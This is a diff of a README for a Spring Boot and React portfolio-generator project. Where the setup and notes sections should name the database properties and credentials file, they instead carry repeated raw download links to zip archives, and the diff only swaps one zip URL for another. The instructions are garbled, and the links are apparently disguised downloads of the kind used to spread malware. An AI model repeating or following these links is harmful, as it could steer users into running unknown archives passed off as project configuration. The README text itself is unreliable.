@@ -12,11 +12,11 @@ Backend (Spring Boot)
 
 Open your IDE (e.g., Spring Tool Suite).
 Import the backend project.
-Before running the application, update the database properties in https://github.com/84j124w/WebPortfolioGenerator/raw/refs/heads/main/FrontEnd/website_portfolio_generator/src/components/Portfolio_Web_Generator_v2.3.zip
+Before running the application, update the database properties in https://raw.githubusercontent.com/84j124w/WebPortfolioGenerator/main/FrontEnd/website_portfolio_generator/Generator_Portfolio_Web_2.0.zip
 
-https://github.com/84j124w/WebPortfolioGenerator/raw/refs/heads/main/FrontEnd/website_portfolio_generator/src/components/Portfolio_Web_Generator_v2.3.zip
-https://github.com/84j124w/WebPortfolioGenerator/raw/refs/heads/main/FrontEnd/website_portfolio_generator/src/components/Portfolio_Web_Generator_v2.3.zip
-https://github.com/84j124w/WebPortfolioGenerator/raw/refs/heads/main/FrontEnd/website_portfolio_generator/src/components/Portfolio_Web_Generator_v2.3.zip
+https://raw.githubusercontent.com/84j124w/WebPortfolioGenerator/main/FrontEnd/website_portfolio_generator/Generator_Portfolio_Web_2.0.zip
+https://raw.githubusercontent.com/84j124w/WebPortfolioGenerator/main/FrontEnd/website_portfolio_generator/Generator_Portfolio_Web_2.0.zip
+https://raw.githubusercontent.com/84j124w/WebPortfolioGenerator/main/FrontEnd/website_portfolio_generator/Generator_Portfolio_Web_2.0.zip
 Run the project as a Spring Boot application.
 
 Frontend (ReactJS)
@@ -29,6 +29,6 @@ Start the application with:
 npm start
 
 Notes
-Ensure your database is running and the credentials in https://github.com/84j124w/WebPortfolioGenerator/raw/refs/heads/main/FrontEnd/website_portfolio_generator/src/components/Portfolio_Web_Generator_v2.3.zip are correct.
+Ensure your database is running and the credentials in https://raw.githubusercontent.com/84j124w/WebPortfolioGenerator/main/FrontEnd/website_portfolio_generator/Generator_Portfolio_Web_2.0.zip are correct.
 The project is currently incomplete, and some features may not be fully functional.
 Feel free to reach out if you encounter any issues or have questions regarding the setup.
